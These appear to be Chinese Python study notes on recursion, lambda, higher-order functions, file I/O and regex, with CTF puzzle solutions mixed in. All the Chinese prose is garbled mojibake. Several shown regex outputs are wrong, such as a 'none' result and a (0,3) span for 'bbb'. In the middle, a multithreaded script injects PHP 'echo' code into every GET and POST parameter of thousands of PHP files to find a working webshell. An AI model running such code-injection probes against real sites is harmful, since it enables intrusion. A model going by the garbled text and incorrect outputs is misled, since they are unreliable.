# Python - é€’å½’

- [å­¦ä¹ æ¥æº](https://www.bilibili.com/video/BV1o4411M71o?p=1)

<p align="center">
    <img src="http://p1.music.126.net/d2IB2I-8FcSOWN7xk1lwxA==/109951165274287603.jpg?param=130y130" width="25%">
</p>

<p align="center">ğŸ‘´ ç™¾å˜é…’ç²¾</p>
<p align="center"><a href="https://music.163.com/#/song?id=1474404223"><font>ã€ŠCenterfoldã€‹</font></a> </p>
<p align="center">ä¸“è¾‘ï¼šç™¾å˜é…’ç²¾</p>
<p align="center">æ­Œæ‰‹ï¼šæ³•è€</p>


## é€’å½’

**é€’å½’çš„åº”ç”¨åœºæ™¯**

é€’å½’æ˜¯ä¸€ç§ç¼–ç¨‹æ€æƒ³ï¼Œåº”ç”¨åœºæ™¯:
  1. åœ¨æˆ‘ä»¬æ—¥å¸¸å¼€å‘ä¸­ï¼Œå¦‚æœè¦éå†ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹é¢æ‰€æœ‰çš„æ–‡ä»¶ï¼Œé€šå¸¸ä¼šä½¿ç”¨é€’å½’æ¥å®ç°ï¼š
  2. åœ¨åç»­çš„ç®—æ³•è¯¾ç¨‹ä¸­ï¼Œå¾ˆå¤šç®—æ³•éƒ½ç¦»ä¸å¼€é€’å½’ï¼Œä¾‹å¦‚ï¼šå¿«é€Ÿæ’åºã€‚

**é€’å½’çš„ç‰¹ç‚¹**
  - å‡½æ•°çš„å†…éƒ¨è‡ªå·±è°ƒç”¨è‡ªå·±
  - å¿…é¡»è¦æœ‰å‡ºå£

#### å®ä¾‹

åº”ç”¨ï¼š3ä»¥å†…æ•°å­—ç´¯åŠ å’Œ
- ä»£ç ï¼š
```py
# 3+2+1
def sum_numbers(num):
    # 1.å¦‚æœæ˜¯1,åˆ™ç›´æ¥è¿”å›1 -- å‡ºå£
    if num == 1:
        return 1
    # 2 å¦‚æœä¸æ˜¯1ï¼Œåˆ™é‡å¤æ‰§è¡Œç´¯åŠ å¹¶è¿”å›ç»“æœ
    return num + sum_numbers(num-1)
Num = int(input('è¾“å…¥ä¸€ä¸ªå¼€å§‹æ•°å­—'))
sum_result = sum_numbers(Num)
# è¾“å‡ºç»“æœä¸º6
print(sum_result)
```
> æ­¤æ—¶å½“è¾“å…¥æ•°å€¼å¤§äº 1000 æ—¶ä¼šæŠ¥é”™

## lambda

### lambda è¡¨è¾¾å¼

ä»€ä¹ˆæ˜¯ `lambda` ï¼šä¸ºäº†ç®€åŒ–ä»£ç 
é€‚é…åœºæ™¯ï¼šå¦‚æœä¸€ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªè¿”å›å€¼ï¼Œå¹¶ä¸”åªæœ‰ä¸€å¥ä»£ç ï¼Œåˆ™å¯ä»¥ä½¿ç”¨`lambda`ç®€åŒ–ã€‚

`lambda` è¯­æ³•:
```py
lambda å‚æ•°åˆ—è¡¨:è¡¨è¾¾å¼
```
> æ³¨æ„
- lambda è¡¨è¾¾å¼çš„å‚æ•°å¯æœ‰å¯æ— ï¼Œå‡½æ•°çš„å‚æ•°åœ¨lambda è¡¨è¾¾å¼ä¸­å®Œå…¨é€‚ç”¨ã€‚
- lambda è¡¨è¾¾å¼èƒ½æ¥æ”¶ä»»ä½•æ•°é‡çš„å‚æ•°ï¼Œä½†æ˜¯åªèƒ½è¿”å›ä¸€ä¸ªè¡¨è¾¾å¼çš„å€¼ã€‚

**å®ä¾‹**
> ä½¿ç”¨å‡½æ•°å’Œlambda åˆ†åˆ«å®ç° æ‰“å° 100
```py
# éœ€æ±‚ å‡½æ•° è¿”å›å€¼100
# 1.ä½¿ç”¨å‡½æ•°
def fn1():
    return 100

print(fn1())



# 2.ä½¿ç”¨lambda
print((lambda:100))
'''
å‘ç°æ‰“å°å‡ºçš„æ˜¯å†…å­˜åœ°å€
<function <lambda> at 0x000001CA1FDA3D38>
'''
# å½“æˆ‘ä»¬è°ƒç”¨è¿”å›å€¼
fn2 = lambda:100
print(fn2())
# å‘ç°è¿”å›ä¸º100
'''
100
'''
```

### **å®ä¾‹**

> è¾“å…¥ä¸¤ä¸ªå€¼ï¼Œè®¡ç®— a+b
- **å‡½æ•°å®ç°**
    ```py
    int1 = input('a:')
    int2 = input('b:')
    def add(a, b):
        a = int(a)
        b = int(b)
        return a + b


    resout = add(int1, int2)
    print(resout)
    '''
    a:1
    b:1
    2
    '''
    ```

- **ä½¿ç”¨ lambda**
    ```py
    int1 = input('a:')
    int2 = input('b:')

    num = lambda a, b: int(a) + int(b)
    print(num(int1,int2))
    ```

#### lambdaçš„å‚æ•°å½¢å¼

- **æ— å‚æ•°**
    ```py
    fn1 = lambda:100
    print(fn1())
    ```

- **ä¸€ä¸ªå‚æ•°**
    ```py
    fn1 = lambda a: a
    print(fn1('hello world'))
    ```

- **é»˜è®¤å‚æ•°**
    ```py
    int1 = input('a:')
    int2 = input('b:')

    fn1 = lambda a,b,c=100 : int(a) + int(b) +c # æ­¤æ—¶cæ˜¯é»˜è®¤å‚æ•° 100
    print(fn1(int1,int2)) # æ­¤æ—¶å€¼ä¸ºï¼šint1 + int2 +100
    print(fn1(int1,int2,200)) # æ­¤æ—¶å€¼ä¸ºï¼šint1 + int2 +200
    ```

- **å¯å˜å‚æ•°(ä¸å®šé•¿å‚æ•°)**
    ```py
    int1 = input('a:')
    int2 = input('b:')

    fn1= lambda *args:args
    print(fn1(int1,int2))

    '''
    a:11
    b:22
    ('11', '22')
    '''
    ```

- **å¯å˜å‚æ•°(kwargs)**
    ```py
    int1 = input('a:')
    int2 = input('b:')

    fn5 = lambda **kwargs:kwargs # è¿”å›ä¸€ä¸ªå­—å…¸
    print(fn5(name = int1,age = int2))
    '''
    a:tom
    b:12
    {'name': 'tom', 'age': '12'}
    '''
    ```

## lambda çš„åº”ç”¨

- å¸¦åˆ¤æ–­çš„**lambda**
    > è¾“å…¥ä¸¤ä¸ªæ•°ï¼Œåˆ¤æ–­ä¸¤ä¸ªæ•°çš„å¤§å°
    ```py
    int1 = input('a:')
    int2 = input('b:')

    fn5 = lambda a,b:a if int(a) > int(b) else b
    print(fn5(int1,int2))
    ```
-  å¯¹ name key å¯¹åº”çš„å€¼è¿›è¡Œå‡åºæ’åº
    ```py
        students = [
        {'name':'tom','age':'12'},
        {'name':'Rose','age':'24'},
        {'name':'Jack','age':'20'}
    ]

    # å¯¹ name key å¯¹åº”çš„å€¼è¿›è¡Œå‡åºæ’åº
    students.sort(key=lambda x: x['name'])
    print(students)
    ```

-  å¯¹ name key å¯¹åº”çš„å€¼è¿›è¡Œé™åºæ’åº
    ```py
        students = [
        {'name':'tom','age':'12'},
        {'name':'Rose','age':'24'},
        {'name':'Jack','age':'20'}
    ]

    # å¯¹ name key å¯¹åº”çš„å€¼è¿›è¡Œé™åºæ’åº
    students.sort(key=lambda x: x['name'],reverse = True)
    print(students)
    ```

## é«˜é˜¶å‡½æ•°
> æŒ‡å°†å‡½æ•°ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œè¿™æ ·çš„å‡½æ•°ç§°ä¸ºé«˜é˜¶å‡½æ•°ï¼Œé«˜é˜¶å‡½æ•°æ˜¯å‡½æ•°å¼ç¼–ç¨‹çš„ä½“ç°ã€‚å‡½æ•°å¼ç¼–ç¨‹å°±æ˜¯æŒ‡è¿™ç§æŠ½è±¡çš„ç¼–ç¨‹èŒƒå¼ã€‚

å®ä¾‹ï¼š
å°†ä»»æ„ä¸¤ä¸ªæ•°å­—ï¼ŒæŒ‰ç…§æŒ‡å®šè¦æ±‚æ•´ç†æ•°å­—åå†è¿›è¡Œæ±‚å’Œè®¡ç®—ã€‚

- å®ä¾‹ä¸€ï¼š
    ```py
    inta = int(input('a:'))
    intb = int(input('b:'))
    result = lambda a, b:abs(a)+abs(b) # abs() å‡½æ•°è¿”å›æ•°å­—çš„ç»å¯¹å€¼ã€‚
    print(result(inta,intb))

    '''
    è¿è¡Œç»“æœï¼š
    a:-3
    b:5
    8
    '''
    ```

- å®ä¾‹äºŒï¼š
    ```py
    inta = int(input('a:'))
    intb = int(input('b:'))
    result = lambda a,b,f:f(a)+f(b)
    print(result(inta,intb,abs))

    '''
    è¿è¡Œç»“æœï¼š
    a:-3
    b:5
    8
    '''
    ```
    å‡å¦‚æ‰æ­¤æ—¶ï¼Œæˆ‘ä»¬éœ€è¦å¯¹inta å’Œintbè¿›è¡Œå››èˆäº”å…¥çš„è¿ç®—ï¼Œæ­¤æ—¶ç¬¬ä¸€ç§æ–¹æ³•åªèƒ½é‡æ–°å®šä¹‰ä¸€ä¸ªå‡½æ•°æˆ–è€…é‡å†™å‡½æ•°ã€‚è€Œç¬¬äºŒä¸ªå‡½æ•°åˆ™ç›´æ¥ä¿®æ”¹ä¼ å…¥çš„æ•°å€¼å³å¯è¿›è¡Œæ›´æ”¹ã€‚

    > ä¸¤ç§å†™æ³•å¯¹æ¯”åä¼šå‘ç°ï¼Œæ–¹æ³•2çš„ä»£ç ä¼šæ›´æ€¥ç®€æ´ï¼Œå‡½æ•°çµæ´»æ€§æ›´é«˜ã€‚
å‡½æ•°å¼ç¼–ç¨‹å¤§é‡ä½¿ç”¨å‡½æ•°ï¼Œå‡å°‘äº†ä»£ç çš„é‡å¤ï¼Œå› æ­¤ç¨‹åºä¼šæ¯”è¾ƒçŸ­ï¼Œå¼€å‘é€Ÿåº¦è¾ƒå¿«ã€‚

### å†…ç½®é«˜é˜¶å‡½æ•°

#### map()

map(func,lst),å°†ä¼ å…¥çš„å‡½æ•°å˜é‡ func ä½œç”¨åˆ°lst å˜é‡çš„æ¯ä¸ªå…ƒç´ ä¸­ï¼Œå¹¶å°†ç»“æœç»„æˆæ–°çš„åˆ—è¡¨(py2)/è¿­ä»£å™¨(py3)è¿”å›

éœ€æ±‚ï¼šè®¡ç®—`list1`åºåˆ—ä¸­å„ä¸ªæ•°å­—çš„2æ¬¡æ–¹ã€‚

```py
# 1. å‡†å¤‡åˆ—è¡¨æ•°æ®
list1 = [1, 2, 3, 4, 5]
# 2. å‡†å¤‡2æ¬¡æ–¹è®¡ç®—çš„å‡½æ•°
def func(x):
    return x**2
# 3.è°ƒç”¨map
result = map(func, list1)
# 4.è¾“å‡ºç»“æœ
print(result)
'''
æ­¤æ—¶è¾“å‡ºçš„æ˜¯è¿­ä»£å™¨ï¼š
<map object at 0x000001ED2C5A6648>
'''
# éœ€è¦å°†æ•°æ®ç±»å‹è½¬æ¢ä¸ºåˆ—è¡¨
print(list(result))
'''
[1, 4, 9, 16, 25]
'''
```

#### reduce()

reduce(func,lst),å…¶ä¸­ func å¿…é¡»è¦æœ‰ä¸¤ä¸ªå‚æ•°ã€‚æ¯æ¬¡ func è®¡ç®—çš„ç»“æœç»§ç»­å’Œåºåˆ—çš„ä¸‹ä¸€ä¸ªå…ƒç´ åšç´¯ç§¯è®¡ç®—ã€‚

> æ³¨æ„ï¼šreduce() ä¼ å…¥çš„å‚æ•° func å¿…é¡»æ¥æ”¶ 2ä¸ªå‚æ•°ã€‚

éœ€æ±‚ï¼šè®¡ç®— list1 åºåˆ—ä¸­å„ä¸ªæ•°å­—ç´¯è®¡çš„å’Œã€‚

å¦‚æœæƒ³è¦ä½¿ç”¨è¯¥å‡½æ•°ï¼Œå¿…é¡»å¯¼å…¥å¯¹åº”çš„åº“
```py
# 1. å‡†å¤‡åˆ—è¡¨æ•°æ®å¹¶å¯¼å…¥æ¨¡å—
list1 = [1, 2, 3, 4, 5]
import functools
# 2. å‡†å¤‡åŠŸèƒ½å‡½æ•°
def func(a,b):
    return a + b
# 3.è°ƒç”¨reduseè®¡ç®—å‡½æ•°çš„ç´¯åŠ å’Œ
result = functools.reduce(func,list1)
print(result) # 15

```
> æ³¨æ„è¯¥å‡½æ•°ä¸ºç´¯è®¡å åŠ çš„æ–¹æ³•ã€‚


#### filter()

filter(func,lst) å‡½æ•°ç”¨äºè¿‡æ»¤åºåˆ—ï¼Œè¿‡æ»¤æ‰ä¸ç¬¦åˆæ¡ä»¶çš„å…ƒç´ ï¼Œè¿”å›ä¸€ä¸ªfilter å¯¹è±¡ã€‚å¦‚æœè¦è½¬æ¢ä¸ºåˆ—è¡¨ï¼Œå¯ä»¥ä½¿ç”¨list()æ¥è½¬æ¢ã€‚

```py
# 1. å‡†å¤‡åˆ—è¡¨æ•°æ®
list1 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
# 2. å‡†å¤‡åŠŸèƒ½å‡½æ•°
def func(x):
    return x % 2 == 0
# å¯¹ç›®æ ‡å‡½æ•°è¿›è¡Œè¿‡æ»¤
result = filter(func,list1)

print(result)
'''
<filter object at 0x000001D50F0A6788>
'''
print(list(result))
'''
[2, 4, 6, 8, 10]
'''
```

### æ€»ç»“

- é€’å½’
  - å‡½æ•°å†…éƒ¨è‡ªå·±è°ƒç”¨è‡ªå·±
  - å¿…é¡»æœ‰å‡ºå£
- lambda
  - è¯­æ³•
    ```py
    lambda å‚æ•°åˆ—è¡¨ï¼šè¡¨è¾¾å¼
    ```
  - lambda çš„å‚æ•°å½¢å¼
    - æ— å‚æ•°
    ```py
    lambda:è¡¨è¾¾å¼
    ```
    - ä¸€ä¸ªå‚æ•°
    ```py
    lambda å‚æ•°ï¼šè¡¨è¾¾å¼
    ```
    - é»˜è®¤å‚æ•°
    ```py
    lambda key = value:è¡¨è¾¾å¼
    ```
    - ä¸å®šé•¿ä½ç½®å‚æ•°
    ```py
    lambda *args:è¡¨è¾¾å¼
    ```
    - ä¸å®šé•¿å…³é”®å­—å‚æ•°
    ```py
    lambda **kwargs: è¡¨è¾¾å¼
    ```
- é«˜é˜¶å‡½æ•°
  - map()
  - reduce()
  - filter()

## æ–‡ä»¶æ“ä½œ

### ç›®å½•

 - æ–‡ä»¶æ“ä½œçš„ä½œç”¨
 - æ–‡ä»¶çš„åŸºæœ¬æ“ä½œ
   - æ‰“å¼€
   - è¯»å†™
   - å…³é—­
 - æ–‡ä»¶å¤‡ä»½
 - æ–‡ä»¶å’Œæ–‡ä»¶å¤¹çš„æ“ä½œ

### æ–‡ä»¶æ“ä½œçš„ä½œç”¨

> ä»€ä¹ˆæ˜¯æ–‡ä»¶?ä»€ä¹ˆæ˜¯æ–‡ä»¶æ“ä½œ

æ–‡ä»¶æ“ä½œåŒ…å«ä»€ä¹ˆï¼Ÿæ‰“å¼€ã€å…³é—­ã€è¯»å†™ã€å¤åˆ¶ç­‰ç­‰

æ–‡ä»¶çš„æ“ä½œçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ
è¯»å–å†…å­˜ï¼Œå†™å…¥å†…å­˜ï¼Œå¤‡ä»½å†…å­˜...

> æ–‡ä»¶çš„æ“ä½œçš„ä½œç”¨å°±æ˜¯ `æŠŠä¸€äº›å†…å®¹(æ•°æ®)å­˜å‚¨èµ·æ¥ï¼Œæ–¹ä¾¿ç¨‹åºä¸‹ä¸€æ¬¡æ‰§è¡Œçš„æ—¶å€™ç›´æ¥ä½¿ç”¨ï¼Œä¸å¿…é‡æ–°åˆ¶ä½œä¸€ä»½ï¼Œçœæ—¶çœåŠ›ã€‚`

### æ–‡ä»¶çš„åŸºæœ¬æ“ä½œ

> æ–‡ä»¶çš„æ“ä½œæ­¥éª¤

- æ‰“å¼€æ–‡ä»¶
- è¯»å†™ç­‰æ“ä½œ
- å…³é—­æ–‡ä»¶

#### æ‰“å¼€æ–‡ä»¶

åœ¨pythonä¸­ï¼Œä½¿ç”¨open å‡½æ•°ï¼Œ`å¯ä»¥æ‰“å¼€ä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ–‡ä»¶ï¼Œæˆ–è€…åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶`ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š
```py
open(name,mode)

open('/root/1.txt','w')
```

- name:æ˜¯è¦æ‰“å¼€çš„ç›®æ ‡æ–‡ä»¶åçš„å­—ç¬¦ä¸²(å¯ä»¥åŒ…å«æ–‡ä»¶æ‰€åœ¨çš„å…·ä½“è·¯å¾„)ã€‚
- mode:è®¾ç½®æ‰“å¼€æ–‡ä»¶çš„æ¨¡å¼(è®¿é—®æ¨¡å¼)ï¼šå†™å…¥ï¼Œåªè¯»ï¼Œè¿½åŠ ç­‰ç­‰ã€‚


ä½“éªŒæ–‡ä»¶æ“ä½œ

- 1. æ‰“å¼€

- 2. è¯»å†™æ“ä½œ

- 3. å…³é—­

```py
# 1. æ‰“å¼€æ–‡ä»¶
f = open('12.txt','w')
# 2. è¯»å†™æ“ä½œ
f.write('test')
# 3ï¼Œ å…³é—­æ–‡ä»¶
f.close()
```
> å¦‚æœæ˜¯å­˜åœ¨æ–‡ä»¶åˆ™å†™å…¥ï¼Œä¸å­˜åœ¨ä¼šè‡ªåŠ¨åˆ›å»ºæ–‡ä»¶ã€‚æ­¤æ—¶ä¼šå‘ç°ï¼Œæ–‡ä»¶ä¸­å·²ç»å†™å…¥ test å­—ç¬¦ã€‚



#### è¯»å–å‡½æ•°

- read()
```py
æ–‡ä»¶å¯¹è±¡.read(num)
```
> numè¡¨ç¤ºè¦ä»æ–‡ä»¶ä¸­è¯»å–çš„æ•°æ®çš„é•¿åº¦(å•ä½æ˜¯Xå­—èŠ‚)ï¼Œå¦‚æœæ²¡æœ‰ä¼ å…¥ numï¼Œé‚£ä¹ˆå°±è¡¨ç¤ºè¯»å–æ–‡ä»¶ä¸­çš„æ‰€æœ‰æ•°æ®ã€‚

- readlines()

readlines å¯ä»¥æŒ‰ç…§è¡Œçš„æ–¹å¼æŠŠæ•´ä¸ªæ–‡ä»¶ä¸­çš„å†…å®¹è¿›è¡Œä¸€æ¬¡è¯»å–ï¼Œå¹¶ä¸”è¿”å›ä¸€ä¸ªæ˜¯åˆ—è¡¨ï¼Œå¦»å­æ¯ä¸€è¡Œçš„æ•°æ®ä¸ºä¸€ä¸ªå…ƒç´ ã€‚

```py
# 1. æ‰“å¼€æ–‡ä»¶,å¯¹æ–‡ä»¶è¿›è¡Œå†™å…¥æ•°æ®ï¼Œå¹¶è¯»å–æ–‡ä»¶å†…å®¹çš„æ“ä½œã€‚
f = open('1.txt','w')
# 2. è¯»å†™æ“ä½œ
f.write('test')
f.close()
f = open('1.txt')
content = f.readlines()
# 3ï¼Œ å…³é—­æ–‡ä»¶
f.close()
print(content)
```



**é€šè¿‡äºŒè¿›åˆ¶æ•°ç”ŸæˆäºŒç»´ç **
```py
from PIL import Image
x = 45
y = 45
im = Image.new('RGB', (x, y))
white = (255, 255, 255)
black = (0, 0, 0)
with open('D:\py\æ–°å»ºæ–‡ä»¶å¤¹\ss.txt') as f:
    for i in range(x):
        ff = f.readline()
        for j in range(y):
            if ff[j] == '1':
                im.putpixel((i, j), black)
            else:
                im.putpixel((i, j), white)
im.show()
```

**color**
```py
c1 = '11111111010111101111'
c2 = '11111011111110111111'
c3 = '00001100101010110001'
c4 = '01001010010000001101'
c5 = '11010011011101010111'
c6 = '10011011011010110110'
c7 = '00111001101101111101'

flag = ''

for i in range(0,20):
    c = c1[i]+c2[i]+c3[i]+c4[i]+c5[i]+c6[i]+c7[i]
    flag += chr(int(c,2))

print (flag)
```

**æ€€ç–‘äººç”Ÿ**




`flag{hacker`

```
..... ..... ....! ?!!.? ..... ..... ....? .?!.? ....! .?... ..... .....
..!?! !.?.. ..... ..... ..?.? !.?.. ..... ..... ..... ..... !.?.. .....
..... .!?!! .?!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ....! ?!!.?
!!!!! !?.?! .?!!! !!!!! !!!!! .!!!. ?.... ..... ..... .!?!! .?... .....
..... .?.?! .?!.? .
```

ookç¼–ç 

é‚£ä¹ˆåœ¨çº¿ è§£ç  `https://www.splitbrain.org/services/ook`

![](img/6.png)

å¾—åˆ°   3oD54e

æŸ¥äº†å¥½ä¹…è¿™ä¸ªå±…ç„¶æ˜¯base58

è¿˜æ˜¯base58åœ¨çº¿è§£ç   `https://www.jisuan.mobi/pbHzbBHbzHB6uSJx.html`

å¾—åˆ° `misc`

flag{hackermisc12580}





**è„šæœ¬åˆ†æ**
> çŒœæµ‹è¿™å‡ åƒä¸ªphpæ–‡ä»¶ä¸­è‚¯å®šå«æœ‰å¯ä»¥ä½¿ç”¨çš„shellï¼Œæˆ‘ä»¬åªæœ‰å†™è„šæœ¬å»è¯•äº†.
```py
import os
import requests
import re
import threading
import time
print('å¼€å§‹æ—¶é—´ï¼š  '+  time.asctime( time.localtime(time.time()) ))
s1=threading.Semaphore(100)  							  			#è¿™å„¿è®¾ç½®æœ€å¤§çš„çº¿ç¨‹æ•°
filePath = r"C:\phpStudy\PHPTutorial\WWW\src"
os.chdir(filePath)													#æ”¹å˜å½“å‰çš„è·¯å¾„
requests.adapters.DEFAULT_RETRIES = 5								#è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥
files = os.listdir(filePath)
session = requests.Session()
session.keep_alive = False											 # è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalse
def get_content(file):
    s1.acquire()
    print('trying   '+file+ '     '+ time.asctime( time.localtime(time.time()) ))
    with open(file,encoding='utf-8') as f:							#æ‰“å¼€phpæ–‡ä»¶ï¼Œæå–æ‰€æœ‰çš„$_GETå’Œ$_POSTçš„å‚æ•°
            gets = list(re.findall('\$_GET\[\'(.*?)\'\]', f.read()))
            posts = list(re.findall('\$_POST\[\'(.*?)\'\]', f.read()))
    data = {}														#æ‰€æœ‰çš„$_POST
    params = {}														#æ‰€æœ‰çš„$_GET
    for m in gets:
        params[m] = "echo 'xxxxxx';"
    for n in posts:
        data[n] = "echo 'xxxxxx';"
    url = 'http://127.0.0.1/src/'+file
    req = session.post(url, data=data, params=params)			#ä¸€æ¬¡æ€§è¯·æ±‚æ‰€æœ‰çš„GETå’ŒPOST
    req.close()												# å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜
    req.encoding = 'utf-8'
    content = req.text
    #print(content)
    if "xxxxxx" in content:									#å¦‚æœå‘ç°æœ‰å¯ä»¥åˆ©ç”¨çš„å‚æ•°ï¼Œç»§ç»­ç­›é€‰å‡ºå…·ä½“çš„å‚æ•°
        flag = 0
        for a in gets:
            req = session.get(url+'?%s='%a+"echo 'xxxxxx';")
            content = req.text
            req.close()												# å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜
            if "xxxxxx" in content:
                flag = 1
                break
        if flag != 1:
            for b in posts:
                req = session.post(url, data={b:"echo 'xxxxxx';"})
                content = req.text
                req.close()												# å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜
                if "xxxxxx" in content:
                    break
        if flag == 1:													#flagç”¨æ¥åˆ¤æ–­å‚æ•°æ˜¯GETè¿˜æ˜¯POSTï¼Œå¦‚æœæ˜¯GETï¼Œflag==1ï¼Œåˆ™bæœªå®šä¹‰ï¼›å¦‚æœæ˜¯POSTï¼Œflagä¸º0ï¼Œ
            param = a
        else:
            param = b
        print('æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶ï¼š '+file+"  and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°ï¼š%s" %param)
        print('ç»“æŸæ—¶é—´ï¼š  ' + time.asctime(time.localtime(time.time())))
    s1.release()

for i in files:															#åŠ å…¥å¤šçº¿ç¨‹
   t = threading.Thread(target=get_content, args=(i,))
   t.start()
```

---

## Python æ­£åˆ™è¡¨è¾¾å¼

æ­£åˆ™è¡¨è¾¾å¼æ˜¯ä»å·¦åˆ°å³æ¥åŒ¹é…ä¸€ä¸ªå­—ç¬¦ä¸²çš„ã€‚å®ƒèƒ½å¸®åŠ©ä½ å»æ£€æŸ¥æˆ–åŒ¹é…å‡ºå¯¹åº”çš„å­—ç¬¦ä¸²ä¿¡æ¯ã€‚

pythonä¸­åªè¦åŠ å…¥ re æ¨¡å—å³å¯åŒ¹é…å…¨éƒ¨çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚

**re.matchå‡½æ•°**

å‡½æ•°è¯­æ³•ï¼š
```py
re.match(pattern,string,flags=0)
```
|å‚æ•°|æè¿°|
|-|-|
|pattern|åŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼|
|string|è¦åŒ¹é…çš„å­—ç¬¦ä¸²|
|flags|æ ‡å¿—ä½ï¼Œç”¨äºæ§åˆ¶æ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…æ–¹å¼|

> åŒ¹é…æˆåŠŸ `re.match` æ–¹æ³•è¿”å›ä¸€ä¸ªåŒ¹é…çš„å¯¹è±¡ï¼Œå¦åˆ™è¿”å› `None`ã€‚

æˆ‘ä»¬å¯ä»¥ä½¿ç”¨group(num) æˆ– groups() åŒ¹é…å¯¹è±¡å‡½æ•°æ¥è·å–åŒ¹é…è¡¨è¾¾å¼ã€‚

|åŒ¹é…å¯¹è±¡æ–¹æ³•	|æè¿°|
|-|-|
|group(num=0)|	åŒ¹é…çš„æ•´ä¸ªè¡¨è¾¾å¼çš„å­—ç¬¦ä¸²ï¼Œgroup() å¯ä»¥ä¸€æ¬¡è¾“å…¥å¤šä¸ªç»„å·ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹å®ƒå°†è¿”å›ä¸€ä¸ªåŒ…å«é‚£äº›ç»„æ‰€å¯¹åº”å€¼çš„å…ƒç»„ã€‚
|groups()	|è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å°ç»„å­—ç¬¦ä¸²çš„å…ƒç»„ï¼Œä» 1 åˆ° æ‰€å«çš„å°ç»„å·ã€‚


```py
import re
print(re.match('aaa', 'aaa.bbb.ccc').span())  # åœ¨èµ·å§‹ä½ç½®åŒ¹é…
print(re.match('bbb', 'aaa.bbb.ccc').span())         # ä¸åœ¨èµ·å§‹ä½ç½®åŒ¹é…
```
è¿”å›ï¼š

```
(0, 3)
none
```

**re.searchå‡½æ•°**

`re.search` å°è¯•å»åŒ¹é…å…¨éƒ¨å­—ç¬¦ä¸²ï¼Œå»æ‰¾åˆ°ä¸€ä¸ªå¯¹åº”çš„æˆåŠŸåŒ¹é…çš„ç»“æœã€‚

|å‚æ•°	|æè¿°|
|-|-|
|pattern	|åŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼
|string	|è¦åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚
|flags	|æ ‡å¿—ä½ï¼Œç”¨äºæ§åˆ¶æ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…æ–¹å¼

> åŒ¹é…æˆåŠŸre.searchæ–¹æ³•è¿”å›ä¸€ä¸ªåŒ¹é…çš„å¯¹è±¡ï¼Œå¦åˆ™è¿”å›Noneã€‚


```py
# å®ä¾‹ï¼š
import re
print(re.search('bbb', 'aaa.bbb.ccc').span())  # åœ¨èµ·å§‹ä½ç½®åŒ¹é…
print(re.search('aaa', 'aaa.bbb.ccc').span())         # ä¸åœ¨èµ·å§‹ä½ç½®åŒ¹é…
```
è¿”å›ï¼š
```
(0, 3)
(4, 7)
```

**ä¿®é¥°ç¬¦ï¼š re.Sï¼Œre.Mï¼Œre.I**

> ä¿®é¥°æ ‡è¯†ç¬¦è¢«æŒ‡å®šæˆä¸€ä¸ªå¯é€‰çš„èŒƒå›´ï¼Œå¯ä»¥ç†è§£ä¸ºé€šè¿‡æŒ‰ä½OR(|) ä»–ä»¬æ¥æŒ‡å®šï¼Œå¦‚`re.Sï¼Œre.Mï¼Œre.I` ç­‰ç­‰æ¥è¯†åˆ«ä¿®é¥°ç¬¦ã€‚

|ä¿®é¥°ç¬¦	|æè¿°
|-|-|
|re.I|	ä½¿åŒ¹é…å¯¹å¤§å°å†™ä¸æ•æ„Ÿ
|re.L|	åšæœ¬åœ°åŒ–è¯†åˆ«ï¼ˆlocale-awareï¼‰åŒ¹é…
|re.M|	å¤šè¡ŒåŒ¹é…ï¼Œå½±å“ ^ å’Œ $
|re.S|	ä½¿ . åŒ¹é…åŒ…æ‹¬æ¢è¡Œåœ¨å†…çš„æ‰€æœ‰å­—ç¬¦
|re.U|	æ ¹æ®Unicodeå­—ç¬¦é›†è§£æå­—ç¬¦ã€‚è¿™ä¸ªæ ‡å¿—å½±å“ \w, \W, \b, \B.
|re.X|	è¯¥æ ‡å¿—é€šè¿‡ç»™äºˆä½ æ›´çµæ´»çš„æ ¼å¼ä»¥ä¾¿ä½ å°†æ­£åˆ™è¡¨è¾¾å¼å†™å¾—æ›´æ˜“äºç†è§£ã€‚



ç¤ºä¾‹ï¼š

re.I(ä¸åŒºåˆ†å¤§å°å†™)
```py
import re
a = "AcadsdfghgjhgjhGhHghGfFhKmNM";
search = re.findall(r'[g]',a,re.I)
print(search)

'''
è¾“å‡ºç»“æœ
['g', 'g', 'g', 'G', 'g', 'G']
'''
```

### æ£€æµ‹å’Œæ›¿æ¢

**re.sub å‡½æ•°**

è¯­æ³•;
`re.sub(pattern, repl, string, count=0, flags=0)`

|å‚æ•°|ä½œç”¨
|-|-|
|pattern| : æ­£åˆ™ä¸­çš„æ¨¡å¼å­—ç¬¦ä¸²ã€‚
|repl : |æ›¿æ¢çš„å­—ç¬¦ä¸²ï¼Œ`ä¹Ÿå¯ä¸ºä¸€ä¸ªå‡½æ•°`ã€‚
|string : |è¦è¢«æŸ¥æ‰¾æ›¿æ¢çš„åŸå§‹å­—ç¬¦ä¸²ã€‚
|count :| æ¨¡å¼åŒ¹é…åæ›¿æ¢çš„æœ€å¤§æ¬¡æ•°ï¼Œé»˜è®¤ 0 è¡¨ç¤ºæ›¿æ¢æ‰€æœ‰çš„åŒ¹é…ã€‚

ç¤ºä¾‹ï¼š
```py
import re
a = "AcadsdfghgjhgjhGhHghGfFhKmNM";
